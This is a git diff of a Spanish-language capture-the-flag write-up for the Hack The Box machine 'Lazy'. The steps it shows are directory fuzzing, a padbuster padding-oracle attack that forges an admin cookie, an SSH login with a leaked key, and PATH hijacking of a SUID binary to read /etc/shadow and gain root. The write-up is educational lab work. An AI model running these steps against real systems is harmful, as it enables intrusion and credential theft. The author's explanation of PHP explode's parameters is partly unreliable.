@@ -1,12 +1,13 @@
 # 10.10.10.18 - Lazy
+![Lazy](https://user-images.githubusercontent.com/96772264/212466251-7d6cb33b-c076-48f8-adc1-777bf3a05a18.png)
+
 --------------------
+# Part 1: Reconocimiento inicial
 
 Puertos abiertos 22, 80
-
 ```console
 Apache[2.4.7], Bootstrap, PHP[5.5.9-1ubuntu4.21], Title[CompanyDev], X-Powered-By[PHP/5.5.9-1ubuntu4.21]
 ```
-
 ```console
 └─$ wfuzz -t 200 --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://10.10.10.18/FUZZ.php
 
@@ -26,12 +27,15 @@ Apache[2.4.7], Bootstrap, PHP[5.5.9-1ubuntu4.21], Title[CompanyDev], X-Powered-B
 ```
 
 Nos encontramos con una web cutre que parece sacada de los 90s.
+![Lazy1](https://user-images.githubusercontent.com/96772264/212466273-0d11484e-8d51-429c-a6a2-acbd24ca33a5.PNG)
+
 Si me registro como cucuxii:cucuxii sale mi nombre. Pero al no ser python poco sentido tiene un STTI.
 Si pongo admin:admin sale invalid credentials asi que no hay manera de enumerar esto.
 
 En /classes sale un directory listing de "auth.php, db.php, phpfix.php, user.php"
 
-# Padding oracle attack
+--------------------
+# Part 2: Padding oracle attack
 
 La cookie que nos identifica es "auth = YBReycmID4kNzNqibgzqJoq%2BzD9LLtzn"
 ```php
@@ -44,8 +48,7 @@ print(base64_decode(urldecode("YBReycmID4kNzNqibgzqJoq%2BzD9LLtzn")));
 └─$ curl -s http://10.10.10.18/index.php -b "auth=YBReycmID4kNzNqibgzqJoq%2B"
 #Invalid padding 
 ```
-Esto confirma que está encriptado con CBC o cofrado por bloques.
-Padbuster sirve para densencriptar cookies de este tipo (suele requerir tamaño de bloque de 8 bytes)
+Esto confirma que está encriptado con CBC o cofrado por bloques. Padbuster sirve para densencriptar cookies de este tipo (suele requerir tamaño de bloque de 8 bytes)
 ```console
 └─$ padbuster http://10.10.10.18/index.php 'YBReycmID4kNzNqibgzqJoq%2BzD9LLtzn' 8 -cookies 'auth=YBReycmID4kNzNqibgzqJoq%2BzD9LLtzn'
 *** Response Analysis Complete ***
@@ -71,6 +74,7 @@ BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA
 You are currently logged in as admin!
 ```
 Si cambiamos la cookie por esta nueva entramos. Nos dan un enlace donde comparten una clave privada
+![Lazy4](https://user-images.githubusercontent.com/96772264/212466389-97c2b6cb-095c-4d2d-975c-f7b65991d166.PNG)
 
 ```console
 └─$ curl -s http://10.10.10.18/mysshkeywithnamemitsos > id_rsa
@@ -78,6 +82,8 @@ Si cambiamos la cookie por esta nueva entramos. Nos dan un enlace donde comparte
 └─$ ssh -i id_rsa  mitsos@10.10.10.18
 mitsos@LazyClown:~$
 ```
+--------------------
+# Part 3: Path hijacking
 
 ```console
 mitsos@LazyClown:~$ ls
@@ -102,8 +108,8 @@ cat /etc/shadow
 # Confirmamos
 ```
 
-El problema reside en llamar a cat por su ruta relativa en vez de absoluta (/bin/cat) esp se traduce en que el 
-sistema buscar este binario en una serie de rutas ordenadas por prioridad:
+El problema reside en llamar a cat por su ruta relativa en vez de absoluta (/bin/cat) esp se traduce en que el  sistema buscar este binario en una serie de 
+rutas ordenadas por prioridad:
 ```console
 mitsos@LazyClown:~$ echo $PATH
 /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
@@ -111,10 +117,8 @@ mitsos@LazyClown:~$ which cat
 /bin/cat # /usr/bin/cat
 ```
 
-Si existiera un cat malicioso en una ruta anterior a sbin como "/usr/local/sbin" el sistema lo ejecutaria como
-prioritario.
-Como no creo que tengamos acceso a ninguna de esas rutas podemos editar el path para añadir otra como primer 
-orden de prioridad...
+Si existiera un cat malicioso en una ruta anterior a sbin como "/usr/local/sbin" el sistema lo ejecutaria como prioritario.
+Como no creo que tengamos acceso a ninguna de esas rutas podemos editar el path para añadir otra como primer orden de prioridad...
 
 ```console
 mitsos@LazyClown:~$ pwd
@@ -147,7 +151,8 @@ bash-4.3# cat /root/root.txt
 # Extra: Error en PHP
 
 [Fuente](https://0xdf.gitlab.io/2020/07/29/htb-lazy.html)
-Si en registro ponemos admin:admin nos dice que 
+Si en registro ponemos admin:admin nos dice que:
+![Lazy2](https://user-images.githubusercontent.com/96772264/212466349-27c39301-8379-425c-ac28-3c34c816afb5.PNG)
 ```console
 └─$ curl -s -POST http://10.10.10.18/register.php -d "username=admin&password=admin&password_again=admin" | html2text
 # Can't create user: user exists
@@ -155,6 +160,7 @@ Si en registro ponemos admin:admin nos dice que
 # admin=:admin= -> Can't create user: user exists
 ```
 En cambio si intentamos registrarnos como admin==:admin== si nos deja.
+![Lazy3](https://user-images.githubusercontent.com/96772264/212466379-8aeb9fe9-ea76-4170-a9ca-c607b79d7ea6.PNG)
 
 Esto tan extraño se produce por un error de php.
 En /var/www/html/classes/user.php hay una funcion interesante:
@@ -164,6 +170,9 @@ public static function getuserfromcookie($auth) {
   $data = decryptString($auth, $passphrase);
   list($a, $user) = explode("=", $data);
 ...
+```
+El error con la función explode esque al no tener un tercer parámetro que es delimitador quita siempre todos los "=" quedando en que si pones "admin====" al final 
+es como si pusieras solo "admin" (por tanto la cookie es la de admin). Luego se produce algún tipo de bug con la base de datos sql que se duplica la entrada de admin.
 ```
 └─$ php --interactive
 php > $data = "user=admin";
